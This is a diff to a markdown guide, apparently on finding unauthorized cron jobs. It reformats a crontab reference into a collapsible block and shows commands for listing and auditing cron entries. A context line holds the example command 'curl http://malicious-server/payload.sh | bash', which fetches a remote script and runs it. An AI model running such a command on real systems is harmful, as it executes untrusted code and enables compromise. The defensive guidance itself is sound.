@@ -73,7 +73,8 @@ curl http://malicious-server/payload.sh | bash
 crontab -l
 grep CRON /var/log/syslog
 ``` 
-📖 Reference: 🧾 Format of a crontab Entry
+<details>
+<summary>💡 <strong>Reference: Format of a crontab Entry</strong></summary>
 ```text
 *  *  *  *  *  command-to-run
 │  │  │  │  │
@@ -82,7 +83,9 @@ grep CRON /var/log/syslog
 │  │  └───────── Day of Month (1 - 31)
 │  └──────────── Hour (0 - 23)
 └──────────────── Minute (0 - 59)
+</details>
 
+---
 
 - Search cron directories for unauthorized jobs:
 ```bash
